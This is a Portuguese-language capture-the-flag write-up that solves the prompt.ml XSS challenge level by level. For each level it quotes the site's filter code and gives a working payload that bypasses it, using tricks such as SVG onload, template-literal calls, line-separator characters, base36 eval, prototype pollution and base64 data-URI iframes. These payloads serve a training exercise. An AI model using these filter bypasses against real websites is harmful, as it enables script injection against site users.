# Duckware Team - High Knowledge Preparatory School
###### Solved by @Antonio-alexandre

> This CTF is about XSS (Cross-site Scripting)

## Desafio: prompt(1) to win (XSS)
#### Introdução

Esse desafio consiste em um site onde desafia o usuário a descobrir maneiras de executar a função prompt(1) sem que o usuário interaja diretamente.

#### Análise Inicial

O desafio consiste no seguinte site simples, onde contém fases de 1-9 e depois de A-F.

- [Link do desafio](https://prompt.ml)

Ao entrarmos no site, nos deparamos com o seguinte:

[![Print1.png](https://i.postimg.cc/gkTNWVM7/Print1.png)](https://postimg.cc/D81qQX3Q)

Podemos notar algumas informações:

- Há um campo onde o usuário digita seu nome.
- Há um campo onde o usuário digita o código a ser inserido.
- Há um campo onde mostra em tempo real o resultado do código.

#### Solução

Como dito, para resolver os exercícios, será necessário técnicas de [XSS](https://pt.wikipedia.org/wiki/Cross-site_scripting).

Aqui estão algumas informações que podem ser úteis a respeito:

- [Link 1](https://portswigger.net/web-security/cross-site-scripting/)
- [Link 2](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

O primeiro link se refere a uma explicação resumida.
O segundo link se refere a uma lista de códigos.

Começaremos então pelo nível inicial, no caso o nível zero:

### Level 0

O level 0 é um nível simples, contendo o seguinte enunciado:

```
function escape(input) {
    // warm up
    // script should be executed without user interaction
    return '<input type="text" value="' + input + '">';
}        
```

Para esse nível, utilizaremos uma entrada simples, consistindo apenas de:

`"><script>prompt(1)</script>`

Nesse caso, utilizaremos `"` para fechar as aspas do input, e enviar o código com a tag script.

[![Print2.png](https://i.postimg.cc/QCP5RbXk/Print2.png)](https://postimg.cc/7J3fzSJf)

### Level 1

Aqui está o enunciado do nível 1:

```
 Text Viewer
function escape(input) {
    // tags stripping mechanism from ExtJS library
    // Ext.util.Format.stripTags
    var stripTagsRE = /<\/?[^>]+>/gi;
    input = input.replace(stripTagsRE, '');

    return '<article>' + input + '</article>';
}      
```

Nesse nível, qualquer tag html completa que enviarmos será removida. A solução nesse caso é a seguinte:

`<svg/onload=prompt(1)`

Utilizaremos o próprio símbolo `>` dentro do código para fechar a tag.

[![Print3.png](https://i.postimg.cc/q7jNPLwh/Print3.png)](https://postimg.cc/gwLcR3fm)

### Level 2

Aqui está o enunciado do nível 2:

```
function escape(input) {
    //                      v-- frowny face
    input = input.replace(/[=(]/g, '');

    // ok seriously, disallows equal signs and open parenthesis
    return input;
}        
```

Essa questão remove os símbolos `(` e `=`. Ou seja, a resolução utilizada foi a seguinte:

`<script>prompt.call`${1}`</script>`

Ela utiliza uma adaptação para realizar a mesma função em js, uma maneira diferente de realizar o mesmo.

[![Print4.png](https://i.postimg.cc/kgCF9TQf/Print4.png)](https://postimg.cc/HVS794Py)

### Level 3

Aqui está o enunciado do nível 3:

```
function escape(input) {
    // filter potential comment end delimiters
    input = input.replace(/->/g, '_');

    // comment the input to avoid script execution
    return '<!-- ' + input + ' -->';
}        
```

Ele impede o uso de comentários HTML. A solução utilizada para essa questão foi a seguinte:

`--!><img src = 1 onerror = prompt(1)`

Ele basicamente finaliza o comentário dentro do código utilizando `--!>`

[![Print5.png](https://i.postimg.cc/Gp5yBKD0/Print5.png)](https://postimg.cc/8FL59hww)

### Level 5

Aqui está o enunciado do nível 5:

```
function escape(input) {
    // apply strict filter rules of level 0
    // filter ">" and event handlers
    input = input.replace(/>|on.+?=|focus/gi, '_');

    return '<input value="' + input + '" type="text">';
}      
```

Para esse nível, o regex tenta bloquear `>` e `eventos`, como o `onerror` por exemplo. Para essa questão, utilizaremos uma quebra de linha visto que o código não impede. Assim ficou o payload:

```
"type=image src onerror
="prompt(1)
```

[![Print6.png](https://i.postimg.cc/PrDs05y1/Print6.png)](https://postimg.cc/JGR2km9h)

### Level 6

Aqui está o enunciado do nível 6:

```
function escape(input) {
    // let's do a post redirection
    try {
        // pass in formURL#formDataJSON
        // e.g. http://httpbin.org/post#{"name":"Matt"}
        var segments = input.split('#');
        var formURL = segments[0];
        var formData = JSON.parse(segments[1]);

        var form = document.createElement('form');
        form.action = formURL;
        form.method = 'post';

        for (var i in formData) {
            var input = form.appendChild(document.createElement('input'));
            input.name = i;
            input.setAttribute('value', formData[i]);
        }

        return form.outerHTML + '                         \n\
<script>                                                  \n\
    // forbid javascript: or vbscript: and data: stuff    \n\
    if (!/script:|data:/i.test(document.forms[0].action)) \n\
        document.forms[0].submit();                       \n\
    else                                                  \n\
        document.write("Action forbidden.")               \n\
</script>                                                 \n\
        ';
    } catch (e) {
        return 'Invalid form data.';
    }
}        
```

Para essa questão, o código gera um `<form>` e insere as informações `<input name="exemplo">` com base nos dados inseridos como JSON. Para isso, precisaremos utilizar `javascript:` como valor para inserir informações no campo `action`. Utilizaremos então o seguinte payload:

`javascript:prompt(1)#{"action":1}`

[![Print7.png](https://i.postimg.cc/L64Rgp3P/Print7.png)](https://postimg.cc/3Wqzzz6r)

### Level 7

Aqui está o enunciado do nível 7:

```
function escape(input) {
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');
    return segments.map(function(title) {
        // title can only contain 12 characters
        return '<p class="comment" title="' + title.slice(0, 12) + '"></p>';
    }).join('\n');
}        
```

Para esse nível, o código limita a 12 caracteres, e insere cada segmento em `<p>`. Para isso, poderemos utilizar comentários para contornar essa limitação. Utilizaremos então o seguinte payload:

`"><img/src=#"onerror='/*#*/prompt(1)'`

[![Print8.png](https://i.postimg.cc/DZb8LVVr/Print8.png)](https://postimg.cc/k6qJPpgG)

### Level 8

Aqui está o enunciado do nível 8:

```
function escape(input) {
    // prevent input from getting out of comment
    // strip off line-breaks and stuff
    input = input.replace(/[\r\n</"]/g, '');

    return '                                \n\
<script>                                    \n\
    // console.log("' + input + '");        \n\
</script> ';
}        
```

Esse código bloqueia quebras de linha e o caractere `/`. Para essa questão em específico, precisaremos utilizar o `Inspecionar` para verificar o código fonte e o `Console` embutidos no navegador. Dentro do console, e com o campo de input selecionado, digitaremos e enviaremos o seguinte payload:

`document.getElementById("input").value="\u2028prompt(1)\u2028-->";`

Nesse caso, utilizaremos `u2028` que é um separador de linha válido no `javascript`.

[![Print9.png](https://i.postimg.cc/bryrMZDT/Print9.png)](https://postimg.cc/JDFRH4QD)

### Level 9

Aqui está o enunciado do nível 9:

```
function escape(input) {
    // filter potential start-tags
    input = input.replace(/<([a-zA-Z])/g, '<_$1');
    // use all-caps for heading
    input = input.toUpperCase();

    // sample input: you shall not pass! => YOU SHALL NOT PASS!
    return '<h1>' + input + '</h1>';
}        
```

Nesse nível, não poderemos utilizar tags que iniciam com letras de `a-zA-Z`. Além disso, tudo que for digitado será colocado em maísculo. Precisaremos então contornar isso. Para isso, utilizamos o seguinte payload:

`<ſvg/onload=&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;>`

O símbolo [ſ](https://en.wikipedia.org/wiki/Long_s) corresponde a uma maneira arcaica porém ainda reconhecida de escrever a letra `S` minúscula. Sendo assim, quando fica maiúscula, funciona da mesma maneira. Além disso, as informações foram passadas como [HTML Entities](https://symbl.cc/en/html-entities/#:~:text=%E2%AD%90%20Complete%20reference%20table%20of%20all%20HTML%20entities,instructions%20for%20Windows.%20Complete%20list%20of%20HTML%20entities.) para evitar maiores complicações.

[![Print10.png](https://i.postimg.cc/C1NrY25g/Print10.png)](https://postimg.cc/tZsNN2FS)

### Level A

Aqui está o enunciado do nível A:

```
function escape(input) {
    // (╯°□°）╯︵ ┻━┻
    input = encodeURIComponent(input).replace(/prompt/g, 'alert');
    // ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro
    input = input.replace(/'/g, '');

    // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO
    return '<script>' + input + '</script> ';
}        
```

Esse nível bloqueia as palavras `prompt` e o símbolo `'`. Porém, como os filtros são em cadeia, ele não realiza a verificação completa após a entrada. Para contornar, utilizamos o seguinte payload:

`p'rompt(1)`

[![Print11.png](https://i.postimg.cc/CLtPFkhz/Print11.png)](https://postimg.cc/jLHQcWJb)

### Level B

Aqui está o enunciado do nível B:

```
function escape(input) {
    // name should not contain special characters
    var memberName = input.replace(/[[|\s+*/\\<>&^:;=~!%-]/g, '');

    // data to be parsed as JSON
    var dataString = '{"action":"login","message":"Welcome back, ' + memberName + '."}';

    // directly "parse" data in script context
    return '                                \n\
<script>                                    \n\
    var data = ' + dataString + ';          \n\
    if (data.action === "login")            \n\
        document.write(data.message)        \n\
</script> ';
}        
```

Nesse nível, o nome digitado é inserido dentro de um JSON, no caso na linha:

```
var dataString = '{"action":"login","message":"Welcome back, ' + memberName + '."}';
```

Porém, ele não impede o uso de operadores, como o `in` por exemplo. Sendo assim, podemos utilizar o seguinte payload para contornar:

`"(prompt(1))in"`

[![Print12.png](https://i.postimg.cc/PfVK4Y82/Print12.png)](https://postimg.cc/F1cjFfpL)

### Level C

Aqui está o enunciado do nível C:

```
function escape(input) {
    // in Soviet Russia...
    input = encodeURIComponent(input).replace(/'/g, '');
    // table flips you!
    input = input.replace(/prompt/g, 'alert');

    // ノ┬─┬ノ ︵ ( \o°o)\
    return '<script>' + input + '</script> ';
}        
```

Esse código tenta evitar a inserção de prompt, alterando por alert. Porém, outros números e funções são permitidos, o que tem como contornar utilizando a função [eval](https://developer.mozilla.org/pt-BR/docs/Web/JavaScript/Reference/Global_Objects/eval). Para isso, utilizamos o seguinte payload:

`eval(1558153217..toString(36))(1)`

Esse número está em `base36`, e após converter tudo, se transforma em `prompt(1)`

[![Print13.png](https://i.postimg.cc/wxRFw3cz/Print13.png)](https://postimg.cc/V51j6fVZ)

### Level D

Aqui está o enunciado do nível D:

```
 function escape(input) {
    // extend method from Underscore library
    // _.extend(destination, *sources) 
    function extend(obj) {
        var source, prop;
        for (var i = 1, length = arguments.length; i < length; i++) {
            source = arguments[i];
            for (prop in source) {
                obj[prop] = source[prop];
            }
        }
        return obj;
    }
    // a simple picture plugin
    try {
        // pass in something like {"source":"http://sandbox.prompt.ml/PROMPT.JPG"}
        var data = JSON.parse(input);
        var config = extend({
            // default image source
            source: 'http://placehold.it/350x150'
        }, JSON.parse(input));
        // forbit invalid image source
        if (/[^\w:\/.]/.test(config.source)) {
            delete config.source;
        }
        // purify the source by stripping off "
        var source = config.source.replace(/"/g, '');
        // insert the content using mustache-ish template
        return '<img src="{{source}}">'.replace('{{source}}', source);
    } catch (e) {
        return 'Invalid image data.';
    }
}        
```

Nesse nível, o código manipula objetos JSON, a fim de gerar uma imagem com o link inserido. Porém, a vulnerabilidade se encontra na maneira que o objeto proto é manipulado. Nesse caso, ele permite que seja inserida a função onerror, permitindo assim que o código execute a função prompt(1). Para isso, utilizaremos o seguinte payload:

`{"source":{},"__proto__":{"source":"$``onerror=prompt(1)>"}}`

[![Print14.png](https://i.postimg.cc/X70KxLYK/Print14.png)](https://postimg.cc/BtM1nxDt)

### Level F

Aqui está o enunciado do nível F:

```
function escape(input) {
    // sort of spoiler of level 7
    input = input.replace(/\*/g, '');
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');

    return segments.map(function(title, index) {
        // title can only contain 15 characters
        return '<p class="comment" title="' + title.slice(0, 15) + '" data-comment=\'{"id":' + index + '}\'></p>';
    }).join('\n');
}        
```

Nesse nível, ele divide cada segmento utilizando o caractere `#`. Além disso, limita a apenas 15 caracteres. A solução desenvolvida foi a seguinte:

`"><script>``#${prompt(1)}#`</script>`

Nesse código, ele insere normalmente o código, porém utilizando `#` para contornar a limitação de 15 caracteres.

[![Print15.png](https://i.postimg.cc/FHHLnB5S/Print15.png)](https://postimg.cc/rK7sDgpy)

### Level 4 (Non-solved)

Aqui está o enunciado do nível 4:

```
function escape(input) {
    // make sure the script belongs to own site
    // sample script: http://prompt.ml/js/test.js
    if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) {
        var script = document.createElement('script');
        script.src = input;
        return script.outerHTML;
    } else {
        return 'Invalid resource.';
    }
}        
```

Esse exercício está incompleto, pois para resolvê-lo precisaremos inserir informações que correspondam ao URL: https://prompt.ml/js/test.js. Uma solução possível é inserir alguma URL maliciosa, seja ela codificada ou que corresponda exatamente a limitação.

### Level E (Limited)

Aqui está o enunciado do nível E:

```
function escape(input) {
    // I expect this one will have other solutions, so be creative :)
    // mspaint makes all file names in all-caps :(
    // too lazy to convert them back in lower case
    // sample input: prompt.jpg => PROMPT.JPG
    input = input.toUpperCase();
    // only allows images loaded from own host or data URI scheme
    input = input.replace(/\/\/|\w+:/g, 'data:');
    // miscellaneous filtering
    input = input.replace(/[\\&+%\s]|vbs/gi, '_');

    return '<img src="' + input + '">';
}        
```

Nesse nível, o código tenta criar uma tag com a url fornecida. Além disso, ele transforma todos os caracteres em letras maiúsculas e realiza algumas substituições, como `//` por `data`: por exemplo. O problema dessa questão, está no fato de que o navegador utilizado seja compatível com a URI `,data:`, impossibilitando que seja executado na maioria. Utilizei o Firefox para resolver, e o seguinte payload:

`"><IFRAME SRC="data:text/html;base64,PHNjcmlwdD5wcm9tcHQoMSk8L3NjcmlwdD4="`

O valor convertido em base64, corresponde a função `prompt(1)`

[![Print16.png](https://i.postimg.cc/gjpwyMHn/Print16.png)](https://postimg.cc/ftHTDfFN)


